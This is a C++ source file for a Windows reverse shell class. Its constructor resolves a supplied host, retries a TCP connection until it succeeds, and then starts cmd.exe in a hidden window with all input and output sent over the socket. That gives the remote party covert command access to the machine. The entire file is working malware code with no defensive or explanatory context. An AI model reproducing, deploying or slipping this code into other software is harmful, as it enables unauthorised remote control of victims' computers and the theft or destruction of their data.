#include "shell.h"

shell::shell(char * ipaddr, int port_nr)
{
	WSADATA wsaData;
	SOCKET Winsock;
	SOCKET Sock;
	struct sockaddr_in hax;
	char aip_addr[16];
	STARTUPINFOA ini_processo;
	PROCESS_INFORMATION processo_info;

	WSAStartup(MAKEWORD(2, 2), &wsaData);
	Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

	struct hostent *host;
	host = gethostbyname(ipaddr);
	strcpy_s(aip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));

	hax.sin_family = AF_INET;
	hax.sin_port = htons(port_nr);
	hax.sin_addr.s_addr = inet_addr(aip_addr);
	int errorStatus = WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
	while (errorStatus != 0) {
		errorStatus = WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
		Sleep(5);
	}

	//memset(&ini_processo, 0, sizeof(ini_processo));

	ini_processo.cb = sizeof(ini_processo);
	ini_processo.dwFlags = STARTF_USESTDHANDLES;
	ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

	char command[8] = "cmd.exe";
	
	CreateProcessA(NULL, command, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &ini_processo, &processo_info);
}

shell::~shell()
{
}
